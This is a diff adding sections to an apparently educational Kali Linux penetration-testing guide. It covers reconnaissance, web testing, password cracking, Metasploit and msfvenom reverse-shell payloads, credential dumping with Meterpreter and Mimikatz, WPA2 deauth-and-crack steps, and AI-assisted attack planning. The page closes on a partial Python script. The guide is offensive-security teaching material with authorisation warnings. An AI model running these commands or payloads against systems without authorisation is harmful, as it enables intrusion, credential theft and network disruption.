+    <div class="tool-card"><div class="tool-name">Nmap</div><span class="tool-cat">Network Scanner</span><div class="tool-desc">Industry-standard network mapper -- host discovery, port scanning, service version detection, OS fingerprinting, NSE scripting engine with 600+ scripts</div></div>
+    <div class="tool-card"><div class="tool-name">theHarvester</div><span class="tool-cat">OSINT</span><div class="tool-desc">Email address, subdomain, IP, and employee harvesting from Google, Bing, LinkedIn, Shodan, and 20+ other sources</div></div>
+    <div class="tool-card"><div class="tool-name">Recon-ng</div><span class="tool-cat">OSINT Framework</span><div class="tool-desc">Modular web reconnaissance framework with Metasploit-like interface -- workspaces, modules, database, and reporting</div></div>
+    <div class="tool-card"><div class="tool-name">Amass</div><span class="tool-cat">Subdomain Enum</span><div class="tool-desc">Deep subdomain enumeration using passive sources, DNS brute forcing, certificate transparency logs, and web scraping</div></div>
+    <div class="tool-card"><div class="tool-name">Maltego</div><span class="tool-cat">Link Analysis</span><div class="tool-desc">Visual intelligence and link-analysis tool -- transforms discover relationships between people, organisations, domains, IPs</div></div>
+    <div class="tool-card"><div class="tool-name">Shodan CLI</div><span class="tool-cat">IoT Scanner</span><div class="tool-desc">Search engine for internet-connected devices -- finds exposed cameras, routers, industrial systems, and vulnerable services</div></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 03 WEB APP -->
+<section class="sec rv" id="web">
+  <div class="sec-hd"><span class="sec-n">03 //</span><h2 class="sec-t">Web Application Testing Tools<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Web application penetration testing is the most in-demand specialisation in offensive security. Kali provides a complete web testing toolkit covering manual interception with Burp Suite, automated vulnerability scanning with OWASP ZAP, SQL injection with sqlmap, directory and file brute forcing with Gobuster and ffuf, and a full suite of OWASP Top 10 exploitation tools. The standard web testing workflow starts with passive mapping via Burp proxy, moves to active directory brute forcing, then targeted automated testing for common vulnerabilities before manual exploitation.</p>
+  </div>
+  <div class="cb rv" data-l="Burp Suite + OWASP ZAP -- Web Proxy and Scanner">
+    <code><span style="color:var(--t3)"># BURP SUITE -- the primary web app pentesting tool
+# Start Burp (Community Edition included in Kali)</span>
+<span style="color:var(--c)">burpsuite</span> &amp;
+
+<span style="color:var(--t3)"># Configure browser proxy: 127.0.0.1:8080
+# Import Burp CA cert to browser to intercept HTTPS
+
+# OWASP ZAP -- automated scanner
+# Start ZAP daemon (headless for scripting)</span>
+<span style="color:var(--c)">zaproxy</span> <span style="color:var(--o)">-daemon -port</span> 8090 <span style="color:var(--o)">-config</span> api.disablekey=true
+<span style="color:var(--c)">zaproxy</span> <span style="color:var(--o)">-cmd -autorun</span> zap.yaml     <span style="color:var(--t3)"># Automated scan from YAML config</span>
+
+<span style="color:var(--t3)"># ZAP CLI quick scan</span>
+<span style="color:var(--c)">zap-cli</span> quick-scan <span style="color:var(--o)">--self-contained --spider -r</span> http://target.com
+<span style="color:var(--c)">zap-cli</span> report <span style="color:var(--o)">-o</span> report.html <span style="color:var(--o)">-f</span> html</code>
+  </div>
+  <div class="cb rv" data-l="sqlmap + Gobuster + ffuf -- Injection and Directory Brute Force">
+    <code><span style="color:var(--t3)"># SQLMAP -- automated SQL injection detection and exploitation</span>
+<span style="color:var(--c)">sqlmap</span> <span style="color:var(--o)">-u</span> <span style="color:#ff79c6">"http://target.com/page?id=1"</span> <span style="color:var(--o)">--dbs</span>         <span style="color:var(--t3)"># Enumerate databases</span>
+<span style="color:var(--c)">sqlmap</span> <span style="color:var(--o)">-u</span> <span style="color:#ff79c6">"http://target.com/login"</span> <span style="color:var(--o)">--data</span> <span style="color:#ff79c6">"user=a&pass=b"</span> <span style="color:var(--o)">--dbs</span>
+<span style="color:var(--c)">sqlmap</span> <span style="color:var(--o)">-u</span> <span style="color:#ff79c6">"http://target.com/?id=1"</span> <span style="color:var(--o)">-D</span> mydb <span style="color:var(--o)">-T</span> users <span style="color:var(--o)">--dump</span>    <span style="color:var(--t3)"># Dump table</span>
+<span style="color:var(--c)">sqlmap</span> <span style="color:var(--o)">-u</span> <span style="color:#ff79c6">"http://target.com/?id=1"</span> <span style="color:var(--o)">--os-shell</span>               <span style="color:var(--t3)"># OS shell if possible</span>
+<span style="color:var(--c)">sqlmap</span> <span style="color:var(--o)">-r</span> request.txt <span style="color:var(--o)">--level 5 --risk 3</span>               <span style="color:var(--t3)"># From saved Burp request</span>
+
+<span style="color:var(--t3)"># GOBUSTER -- directory, file and DNS brute forcing</span>
+<span style="color:var(--c)">gobuster dir</span> <span style="color:var(--o)">-u</span> http://target.com <span style="color:var(--o)">-w</span> /usr/share/wordlists/dirb/common.txt
+<span style="color:var(--c)">gobuster dir</span> <span style="color:var(--o)">-u</span> http://target.com <span style="color:var(--o)">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt <span style="color:var(--o)">-x</span> php,txt,html,bak
+<span style="color:var(--c)">gobuster dns</span> <span style="color:var(--o)">-d</span> target.com <span style="color:var(--o)">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+<span style="color:var(--t3)"># FFUF -- fast web fuzzer (faster than gobuster for some tasks)</span>
+<span style="color:var(--c)">ffuf</span> <span style="color:var(--o)">-u</span> http://target.com/FUZZ <span style="color:var(--o)">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt
+<span style="color:var(--c)">ffuf</span> <span style="color:var(--o)">-u</span> http://target.com/FUZZ <span style="color:var(--o)">-w</span> wordlist.txt <span style="color:var(--o)">-fs</span> 4242  <span style="color:var(--t3)"># Filter by response size</span>
+<span style="color:var(--c)">ffuf</span> <span style="color:var(--o)">-u</span> http://target.com/login <span style="color:var(--o)">-X POST -d</span> <span style="color:#ff79c6">"user=FUZZ&pass=password"</span> <span style="color:var(--o)">-w</span> users.txt
+
+<span style="color:var(--t3)"># NIKTO -- web server vulnerability scanner</span>
+<span style="color:var(--c)">nikto</span> <span style="color:var(--o)">-h</span> http://target.com
+<span style="color:var(--c)">nikto</span> <span style="color:var(--o)">-h</span> http://target.com <span style="color:var(--o)">-o</span> nikto_report.html <span style="color:var(--o)">-Format</span> html</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 04 PASSWORD ATTACKS -->
+<section class="sec rv" id="password">
+  <div class="sec-hd"><span class="sec-n">04 //</span><h2 class="sec-t">Password Attacks &amp; Credential Testing<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Password attacks remain one of the highest-success attack vectors in real-world penetration tests -- weak passwords, default credentials, password reuse, and insecure storage are still endemic across enterprise environments. Kali provides three primary attack approaches: <strong style="color:var(--c)">online brute forcing</strong> against live services (Hydra, Medusa), <strong style="color:var(--c)">offline hash cracking</strong> against captured hashes (Hashcat, John the Ripper), and <strong style="color:var(--c)">credential spraying</strong> across multiple accounts with a small password list (CrackMapExec, Kerbrute). Each has distinct use cases, detection profiles, and performance characteristics.</p>
+  </div>
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ! ]</span>
+    <p class="al-tx"><strong>Authorised Engagements Only.</strong> Password attacks against live services generate authentication logs and may trigger account lockouts impacting production systems. Always confirm lockout policy and scope before running online brute force tools. Offline hash cracking against captured hashes has no live impact and is safe to run in your lab.</p>
+  </div>
+  <div class="cb rv" data-l="Hydra + Hashcat + John the Ripper -- Password Attacks">
+    <code><span style="color:var(--t3)"># HYDRA -- online brute force (authorised testing only)</span>
+<span style="color:var(--c)">hydra</span> <span style="color:var(--o)">-l</span> admin <span style="color:var(--o)">-P</span> /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+<span style="color:var(--c)">hydra</span> <span style="color:var(--o)">-L</span> users.txt <span style="color:var(--o)">-P</span> passwords.txt ftp://192.168.1.10
+<span style="color:var(--c)">hydra</span> <span style="color:var(--o)">-l</span> admin <span style="color:var(--o)">-P</span> rockyou.txt http-post-form://target.com<span style="color:#ff79c6">"/login:user=^USER^&pass=^PASS^:Invalid"</span>
+<span style="color:var(--c)">hydra</span> <span style="color:var(--o)">-l</span> admin <span style="color:var(--o)">-P</span> rockyou.txt <span style="color:var(--o)">-t 4 -V</span> rdp://192.168.1.10   <span style="color:var(--t3)"># RDP (4 threads)</span>
+
+<span style="color:var(--t3)"># HASHCAT -- GPU-accelerated offline hash cracking</span>
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 0</span>    hash.txt rockyou.txt              <span style="color:var(--t3)"># MD5</span>
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 1000</span> ntlm.txt rockyou.txt             <span style="color:var(--t3)"># NTLM (Windows)</span>
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 1800</span> shadow.txt rockyou.txt            <span style="color:var(--t3)"># SHA512crypt (Linux)</span>
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 2500</span> capture.hccapx rockyou.txt        <span style="color:var(--t3)"># WPA2 handshake</span>
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 1000</span> ntlm.txt rockyou.txt <span style="color:var(--o)">-r</span> rules/best64.rule  <span style="color:var(--t3)"># With rules</span>
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 1000</span> ntlm.txt <span style="color:var(--o)">-a 3</span> <span style="color:#ff79c6">"?u?l?l?l?d?d?d?d"</span>   <span style="color:var(--t3)"># Mask attack</span>
+
+<span style="color:var(--t3)"># JOHN THE RIPPER -- versatile hash cracker</span>
+<span style="color:var(--c)">john</span> <span style="color:var(--o)">--wordlist=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+<span style="color:var(--c)">unshadow</span> /etc/passwd /etc/shadow > unshadowed.txt && <span style="color:var(--c)">john</span> unshadowed.txt
+<span style="color:var(--c)">john</span> <span style="color:var(--o)">--format=NT</span> ntlm_hashes.txt <span style="color:var(--o)">--wordlist=</span>rockyou.txt
+<span style="color:var(--c)">zip2john</span> protected.zip > zip.hash && <span style="color:var(--c)">john</span> zip.hash  <span style="color:var(--t3)"># ZIP password crack</span>
+<span style="color:var(--c)">ssh2john</span> id_rsa > rsa.hash && <span style="color:var(--c)">john</span> rsa.hash        <span style="color:var(--t3)"># SSH private key crack</span>
+
+<span style="color:var(--t3)"># CRACKMAPEXEC -- network-wide credential testing (SMB/SSH/RDP)</span>
+<span style="color:var(--c)">cme smb</span> 192.168.1.0/24 <span style="color:var(--o)">-u</span> admin <span style="color:var(--o)">-p</span> Password123      <span style="color:var(--t3)"># Password spray</span>
+<span style="color:var(--c)">cme smb</span> 192.168.1.10 <span style="color:var(--o)">-u</span> admin <span style="color:var(--o)">-H</span> aad3b435b51404eeaad3b435  <span style="color:var(--t3)"># Pass-the-hash</span>
+<span style="color:var(--c)">cme smb</span> 192.168.1.10 <span style="color:var(--o)">-u</span> admin <span style="color:var(--o)">-p</span> Pass123 <span style="color:var(--o)">--sam</span>          <span style="color:var(--t3)"># Dump SAM hashes</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 05 EXPLOITATION -->
+<section class="sec rv" id="exploit">
+  <div class="sec-hd"><span class="sec-n">05 //</span><h2 class="sec-t">Exploitation Framework &amp; SearchSploit<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p><strong style="color:var(--c)">Metasploit Framework</strong> is the world's most widely used penetration testing framework, included by default in Kali. It provides a unified interface for exploit development, payload generation, post-exploitation, and reporting. <strong style="color:var(--c)">SearchSploit</strong> is the offline command-line interface to Exploit-DB -- a comprehensive database of public exploits and vulnerable software -- enabling rapid exploit searching without internet access, critical during isolated network engagements. Together they form the core exploitation layer of any Kali-based penetration test.</p>
+  </div>
+  <div class="cb rv" data-l="Metasploit + SearchSploit -- Core Exploitation Workflow">
+    <code><span style="color:var(--t3)"># SEARCHSPLOIT -- offline Exploit-DB search</span>
+<span style="color:var(--c)">searchsploit</span> apache 2.4                        <span style="color:var(--t3)"># Search by software and version</span>
+<span style="color:var(--c)">searchsploit</span> <span style="color:var(--o)">-t</span> "buffer overflow" linux         <span style="color:var(--t3)"># Search title only</span>
+<span style="color:var(--c)">searchsploit</span> <span style="color:var(--o)">-x</span> exploits/linux/remote/46635.py <span style="color:var(--t3)"># Examine exploit code</span>
+<span style="color:var(--c)">searchsploit</span> <span style="color:var(--o)">-m</span> 46635                          <span style="color:var(--t3)"># Mirror exploit to current dir</span>
+<span style="color:var(--c)">searchsploit</span> <span style="color:var(--o)">--update</span>                          <span style="color:var(--t3)"># Update local exploit database</span>
+
+<span style="color:var(--t3)"># METASPLOIT -- core framework workflow</span>
+<span style="color:var(--c)">msfconsole</span> <span style="color:var(--o)">-q</span>                                  <span style="color:var(--t3)"># Start (quiet mode)</span>
+<span style="color:var(--c)">msf6 > search</span> eternalblue                      <span style="color:var(--t3)"># Search for modules</span>
+<span style="color:var(--c)">msf6 > use</span> exploit/windows/smb/ms17_010_eternalblue
+<span style="color:var(--c)">msf6 > info</span>                                    <span style="color:var(--t3)"># Module details and required options</span>
+<span style="color:var(--c)">msf6 > set RHOSTS</span> 192.168.1.10
+<span style="color:var(--c)">msf6 > set LHOST</span> 10.10.14.1
+<span style="color:var(--c)">msf6 > set LPORT</span> 4444
+<span style="color:var(--c)">msf6 > set PAYLOAD</span> windows/x64/meterpreter/reverse_tcp
+<span style="color:var(--c)">msf6 > check</span>                                   <span style="color:var(--t3)"># Verify target is vulnerable (if supported)</span>
+<span style="color:var(--c)">msf6 > run</span>
+
+<span style="color:var(--t3)"># MSFVENOM -- standalone payload generator</span>
+<span style="color:var(--c)">msfvenom</span> <span style="color:var(--o)">-p</span> windows/x64/meterpreter/reverse_tcp <span style="color:var(--o)">LHOST</span>=10.0.0.1 <span style="color:var(--o)">LPORT</span>=4444 <span style="color:var(--o)">-f</span> exe <span style="color:var(--o)">-o</span> shell.exe
+<span style="color:var(--c)">msfvenom</span> <span style="color:var(--o)">-p</span> linux/x64/meterpreter/reverse_tcp <span style="color:var(--o)">LHOST</span>=10.0.0.1 <span style="color:var(--o)">LPORT</span>=4444 <span style="color:var(--o)">-f</span> elf <span style="color:var(--o)">-o</span> payload.elf
+<span style="color:var(--c)">msfvenom</span> <span style="color:var(--o)">-p</span> php/reverse_php <span style="color:var(--o)">LHOST</span>=10.0.0.1 <span style="color:var(--o)">LPORT</span>=4444 <span style="color:var(--o)">-f</span> raw <span style="color:var(--o)">-o</span> shell.php
+<span style="color:var(--c)">msfvenom</span> <span style="color:var(--o)">-p</span> java/jsp_shell_reverse_tcp <span style="color:var(--o)">LHOST</span>=10.0.0.1 <span style="color:var(--o)">LPORT</span>=4444 <span style="color:var(--o)">-f</span> war <span style="color:var(--o)">-o</span> shell.war
+
+<span style="color:var(--t3)"># METERPRETER -- post-exploitation shell commands</span>
+<span style="color:var(--c)">meterpreter > sysinfo</span>                          <span style="color:var(--t3)"># System info</span>
+<span style="color:var(--c)">meterpreter > getuid</span>                           <span style="color:var(--t3)"># Current user</span>
+<span style="color:var(--c)">meterpreter > getsystem</span>                        <span style="color:var(--t3)"># Attempt privilege escalation</span>
+<span style="color:var(--c)">meterpreter > hashdump</span>                         <span style="color:var(--t3)"># Dump password hashes</span>
+<span style="color:var(--c)">meterpreter > run post/multi/recon/local_exploit_suggester</span>  <span style="color:var(--t3)"># Local privesc suggestions</span>
+<span style="color:var(--c)">meterpreter > load kiwi</span>                        <span style="color:var(--t3)"># Load Mimikatz</span>
+<span style="color:var(--c)">meterpreter > creds_all</span>                        <span style="color:var(--t3)"># Dump all credentials</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 06 POST-EXPLOITATION -->
+<section class="sec rv" id="postex">
+  <div class="sec-hd"><span class="sec-n">06 //</span><h2 class="sec-t">Post-Exploitation &amp; Privilege Escalation<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Post-exploitation is the phase that separates good penetration testers from great ones. Getting initial access is step one; understanding what that access means, escalating privileges, achieving persistence, and pivoting through the network to demonstrate real business impact is where the real value of a penetration test lies. Kali provides dedicated tools for Linux and Windows privilege escalation enumeration, Active Directory attack automation, and credential extraction.</p>
+  </div>
+  <div class="cb rv" data-l="LinPEAS + WinPEAS + BloodHound -- PrivEsc and AD Attack">
+    <code><span style="color:var(--t3)"># LINPEAS -- Linux privilege escalation enumeration script
+# Transfer to target and run:</span>
+<span style="color:var(--c)">curl</span> -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span style="color:var(--t3"># Or: python3 -m http.server 80 (on Kali), then on target:</span>
+<span style="color:var(--c)">wget</span> http://10.10.14.1/linpeas.sh && <span style="color:var(--c)">chmod +x</span> linpeas.sh && <span style="color:var(--c)">./linpeas.sh</span>
+
+<span style="color:var(--t3)"># WINPEAS -- Windows privilege escalation enumeration</span>
+<span style="color:var(--c)">.\winPEASx64.exe</span> quiet                         <span style="color:var(--t3)"># Quiet mode (less verbose)</span>
+<span style="color:var(--c)">.\winPEASx64.exe</span> servicesinfo                   <span style="color:var(--t3)"># Service-focused check</span>
+
+<span style="color:var(--t3)"># Privilege escalation checks (manual)</span>
+<span style="color:var(--c)">sudo -l</span>                               <span style="color:var(--t3)"># What can current user sudo?</span>
+<span style="color:var(--c)">find / -perm -4000 2>/dev/null</span>        <span style="color:var(--t3)"># SUID binaries (GTFOBins)</span>
+<span style="color:var(--c)">find / -writable -type f 2>/dev/null | grep -v proc</span>  <span style="color:var(--t3)"># Writable files</span>
+<span style="color:var(--c)">crontab -l && cat /etc/crontab</span>        <span style="color:var(--t3)"># Scheduled tasks</span>
+
+<span style="color:var(--t3)"># BLOODHOUND -- Active Directory attack path visualisation
+# Collect data from compromised domain-joined host:</span>
+<span style="color:var(--c)">SharpHound.exe</span> <span style="color:var(--o)">-c All</span>                <span style="color:var(--t3)"># Windows collector</span>
+<span style="color:var(--c)">bloodhound-python</span> <span style="color:var(--o)">-d</span> domain.local <span style="color:var(--o)">-u</span> user <span style="color:var(--o)">-p</span> pass <span style="color:var(--o)">-c All -ns</span> 192.168.1.1  <span style="color:var(--t3)"># Python collector from Kali</span>
+<span style="color:var(--t3)"># Import zip to BloodHound GUI, then run pre-built queries:
+# "Find Shortest Paths to Domain Admins"
+# "Find All Domain Admins"</span>
+
+<span style="color:var(--t3)"># MIMIKATZ -- credential extraction (Windows, Meterpreter or direct)</span>
+<span style="color:var(--c)">meterpreter > load kiwi</span>
+<span style="color:var(--c)">meterpreter > creds_all</span>               <span style="color:var(--t3)"># Dump all credential stores</span>
+<span style="color:var(--c)">meterpreter > lsa_dump_sam</span>            <span style="color:var(--t3)"># SAM database dump</span>
+<span style="color:var(--c)">meterpreter > lsa_dump_secrets</span>        <span style="color:var(--t3)"># LSA secrets</span>
+
+<span style="color:var(--t3)"># Pivoting with Metasploit (route through compromised host)</span>
+<span style="color:var(--c)">meterpreter > run post/multi/manage/shell_to_meterpreter</span>
+<span style="color:var(--c)">msf6 > route add</span> 192.168.2.0/24 &lt;session_id&gt;
+<span style="color:var(--c)">msf6 > use auxiliary/server/socks_proxy</span>
+<span style="color:var(--c)">msf6 > set SRVPORT</span> 1080</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 07 WIRELESS -->
+<section class="sec rv" id="wireless">
+  <div class="sec-hd"><span class="sec-n">07 //</span><h2 class="sec-t">Wireless Security Testing<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Wireless penetration testing requires a compatible wireless adapter that supports <strong style="color:var(--c)">monitor mode</strong> and <strong style="color:var(--c)">packet injection</strong> (Alfa AWUS036ACH, AWUS036ACM, or similar are the standard choices). Kali includes the full <strong style="color:var(--c)">Aircrack-ng suite</strong> for WPA/WPA2 handshake capture and cracking, <strong style="color:var(--c)">Wifite</strong> for automated multi-target wireless attacks, and <strong style="color:var(--c)">Kismet</strong> for passive wireless network discovery and logging. All wireless testing must be performed against networks you own or have explicit written authorisation to test.</p>
+  </div>
+  <div class="cb rv" data-l="Aircrack-ng Suite -- WPA2 Handshake Capture and Cracking">
+    <code><span style="color:var(--t3)"># SETUP: put wireless interface into monitor mode</span>
+<span style="color:var(--c)">iwconfig</span>                                  <span style="color:var(--t3)"># List wireless interfaces</span>
+<span style="color:var(--c)">sudo airmon-ng start</span> wlan0               <span style="color:var(--t3)"># Enable monitor mode</span>
+<span style="color:var(--t3)"># Interface is now wlan0mon</span>
+
+<span style="color:var(--t3)"># Discover nearby networks</span>
+<span style="color:var(--c)">sudo airodump-ng</span> wlan0mon
+
+<span style="color:var(--t3)"># Target specific BSSID and channel, save to file</span>
+<span style="color:var(--c)">sudo airodump-ng</span> <span style="color:var(--o)">-c 6 --bssid</span> AA:BB:CC:DD:EE:FF <span style="color:var(--o)">-w</span> capture wlan0mon
+
+<span style="color:var(--t3)"># Deauth attack to force handshake (sends 10 deauth frames)</span>
+<span style="color:var(--c)">sudo aireplay-ng</span> <span style="color:var(--o)">--deauth 10 -a</span> AA:BB:CC:DD:EE:FF wlan0mon
+
+<span style="color:var(--t3)"># Crack captured WPA2 handshake</span>
+<span style="color:var(--c)">aircrack-ng</span> <span style="color:var(--o)">-w</span> /usr/share/wordlists/rockyou.txt capture*.cap
+<span style="color:var(--c)">aircrack-ng</span> <span style="color:var(--o)">-w</span> rockyou.txt <span style="color:var(--o)">-b</span> AA:BB:CC:DD:EE:FF capture.cap
+
+<span style="color:var(--t3)"># GPU-accelerated crack with Hashcat (faster)</span>
+<span style="color:var(--c)">hcxdumptool</span> <span style="color:var(--o)">-o</span> capture.pcapng <span style="color:var(--o)">-i</span> wlan0mon
+<span style="color:var(--c)">hcxpcapngtool</span> <span style="color:var(--o)">-o</span> hash.hc22000 capture.pcapng
+<span style="color:var(--c)">hashcat</span> <span style="color:var(--o)">-m 22000</span> hash.hc22000 rockyou.txt
+
+<span style="color:var(--t3)"># WIFITE -- automated multi-target wireless attack</span>
+<span style="color:var(--c)">sudo wifite</span>                               <span style="color:var(--t3)"># Interactive target selection</span>
+<span style="color:var(--c)">sudo wifite</span> <span style="color:var(--o)">--wpa --dict</span> rockyou.txt      <span style="color:var(--t3)"># WPA targets with custom wordlist</span>
+
+<span style="color:var(--t3)"># Stop monitor mode after testing</span>
+<span style="color:var(--c)">sudo airmon-ng stop</span> wlan0mon</code>
+  </div>
+</section>
+
+<div class="div div-ai"></div>
+
+<!-- 08 AI INTEGRATION -->
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd"><span class="sec-n">08 //</span><h2 class="sec-t">AI Integration in Kali Linux Operations<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel panel-ai rv-l">
+    <p>Artificial Intelligence is transforming how security professionals use Kali Linux -- not by replacing tool expertise, but by dramatically accelerating every stage of the workflow. AI excels at parsing and interpreting tool output (Nmap XML, Nessus reports, Burp findings), generating engagement-specific command sequences from scope parameters, explaining vulnerability findings in business language for reports, and suggesting attack paths based on discovered services. The most powerful pattern combines Kali's tool output with LLM reasoning to produce intelligence that neither could generate alone.</p>
+  </div>
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">Penetration testers using AI-assisted workflows report spending 60% less time on report writing, 40% faster tool command construction for unfamiliar attack surfaces, and significantly better vulnerability triage accuracy. LLMs bridge the gap between raw tool output and actionable security findings -- a capability that previously required years of experience to develop.</p>
+  </div>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">&#128202;</span><div class="ai-name">Nmap Output Analysis</div><div class="ai-desc">AI parses Nmap XML output and produces structured attack surface analysis -- identifying the highest-risk open ports, suggesting which Metasploit modules to run against detected service versions, flagging dangerous service combinations (e.g. SMB + outdated Windows version = EternalBlue candidate), and prioritising the exploitation order by likelihood of success for the specific target profile.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#9999;&#65039;</span><div class="ai-name">Command Generation</div><div class="ai-desc">LLMs generate optimised, engagement-specific tool commands from scope parameters and discovered services. "I found Apache 2.4.49 on port 80 and OpenSSH 7.2p2 on port 22. What commands should I run?" produces the correct Metasploit module paths, searchsploit queries, Nikto flags, and sqlmap parameters -- without needing to memorise hundreds of tool options and CVE-to-module mappings.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128196;</span><div class="ai-name">Report Writing</div><div class="ai-desc">AI transforms raw Kali tool output into professional penetration test report findings -- converting Nmap, Nikto, Burp, and sqlmap output into structured findings with executive summary, technical description, evidence section, impact analysis, CVSSv4.0 scoring suggestion, and remediation recommendations. Reduces report writing time from days to hours for a standard engagement.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128272;</span><div class="ai-name">Tool Output Explanation</div><div class="ai-desc">AI explains complex tool output to junior testers and clients -- "what does this Nmap NSE script output mean?", "why did sqlmap find this injection point vulnerable?", "what does this Burp repeater response indicate about the server's session handling?" Bridges the gap between raw tool output and security understanding, accelerating team skill development significantly.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128736;&#65039;</span><div class="ai-name">Custom Tool Scripting</div><div class="ai-desc">LLMs generate custom Kali scripts that chain multiple tools together -- Python scripts that run Nmap, parse the XML, automatically run searchsploit against discovered versions, check Shodan for known exposures, and produce a prioritised attack target list. Automates the manual correlation work that consumes hours of a penetration tester's time on large-scope engagements.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128308;</span><div class="ai-name">Attack Path Planning</div><div class="ai-desc">Given a network topology discovered through Nmap and BloodHound, AI suggests the optimal attack path to domain compromise -- identifying the shortest privilege escalation chain, which pivot points to use, which credentials to prioritise cracking, and which lateral movement techniques are most likely to succeed against the specific OS and service versions in scope.</div></div>
+  </div>
+  <div class="panel panel-ai rv" style="margin-top:28px">
+    <div class="panel-t">AI Tools for Kali Linux Operations</div>
+    <table class="ptbl">
+      <thead><tr>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Tool</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Capability</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Kali Use Case</th>
+      </tr></thead>
+      <tbody>
+        <tr><td style="color:var(--g)">GPT-4 / Claude</td><td style="color:var(--t2)">Output analysis, command generation, report writing</td><td style="color:var(--t2)">Parse Nmap/Burp/sqlmap output; generate engagement commands; write findings</td></tr>
+        <tr><td style="color:var(--g)">GitHub Copilot</td><td style="color:var(--t2)">Script completion</td><td style="color:var(--t2)">Autocomplete Python/Bash scripts that chain Kali tools together</td></tr>
+        <tr><td style="color:var(--g)">Pentest-GPT</td><td style="color:var(--t2)">Pentest-specific AI guidance</td><td style="color:var(--t2)">Context-aware penetration testing guidance trained on security data</td></tr>
+        <tr><td style="color:var(--g)">Nuclei + AI templates</td><td style="color:var(--t2)">AI-generated vulnerability templates</td><td style="color:var(--t2)">Generate custom Nuclei templates for discovered vulnerabilities</td></tr>
+        <tr><td style="color:var(--g)">Faraday Platform</td><td style="color:var(--t2)">Collaborative pentest management</td><td style="color:var(--t2)">AI-assisted finding deduplication, risk scoring, and report generation</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="cb cb-ai rv" data-l="AI Pipeline -- Nmap XML Parsing + GPT Attack Surface Analysis">
+    <code><span style="color:#bd93f9">#!/usr/bin/env python3</span>
+<span style="color:var(--t3)"># Parse Nmap XML output and send to GPT for attack surface analysis
+# Usage: sudo nmap -sV -oX scan.xml TARGET && python3 nmap_ai.py scan.xml</span>
+
+<span style="color:#bd93f9">import</span> xml.etree.ElementTree <span style="color:#bd93f9">as</span> ET
+<span style="color:#bd93f9">import</span> json, openai, sys
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">parse_nmap_xml</span>(xml_file):
+    tree = ET.parse(xml_file)
+    root = tree.getroot()
+    hosts = []
+    <span style="color:#bd93f9">for</span> host <span style="color:#bd93f9">in</span> root.findall(<span style="color:#ff79c6">'host'</span>):
+        status = host.find(<span style="color:#ff79c6">'status'</span>)
+        <span style="color:#bd93f9">if</span> status <span style="color:#bd93f9">is None</span> or status.get(<span style="color:#ff79c6">'state'</span>) != <span style="color:#ff79c6">'up'</span>: <span style="color:#bd93f9">continue</span>
+        addr = host.find(<span style="color:#ff79c6">'address'</span>).get(<span style="color:#ff79c6">'addr'</span>)
+        ports = []
+        <span style="color:#bd93f9">for</span> port <span style="color:#bd93f9">in</span> host.findall(<span style="color:#ff79c6">'ports/port'</span>):
+            state = port.find(<span style="color:#ff79c6">'state'</span>)
+            <span style="color:#bd93f9">if</span> state <span style="color:#bd93f9">is None</span> or state.get(<span style="color:#ff79c6">'state'</span>) != <span style="color:#ff79c6">'open'</span>: <span style="color:#bd93f9">continue</span>
+            svc   = port.find(<span style="color:#ff79c6">'service'</span>)
+            ports.append({
+                <span style="color:#ff79c6">'port'</span>   : port.get(<span style="color:#ff79c6">'portid'</span>),
+                <span style="color:#ff79c6">'proto'</span>  : port.get(<span style="color:#ff79c6">'protocol'</span>),
+                <span style="color:#ff79c6">'service'</span>: svc.get(<span style="color:#ff79c6">'name'</span>, <span style="color:#ff79c6">''</span>) <span style="color:#bd93f9">if</span> svc <span style="color:#bd93f9">is not None else</span> <span style="color:#ff79c6">''</span>,
+                <span style="color:#ff79c6">'version'</span>: svc.get(<span style="color:#ff79c6">'product'</span>,<span style="color:#ff79c6">''</span>)+<span style="color:#ff79c6">' '</span>+svc.get(<span style="color:#ff79c6">'version'</span>,<span style="color:#ff79c6">''</span>) <span style="color:#bd93f9">if</span> svc <span style="color:#bd93f9">is not None else</span> <span style="color:#ff79c6">''</span>
+            })
+        <span style="color:#bd93f9">if</span> ports: hosts.append({<span style="color:#ff79c6">'ip'</span>:addr, <span style="color:#ff79c6">'open_ports'</span>:ports})
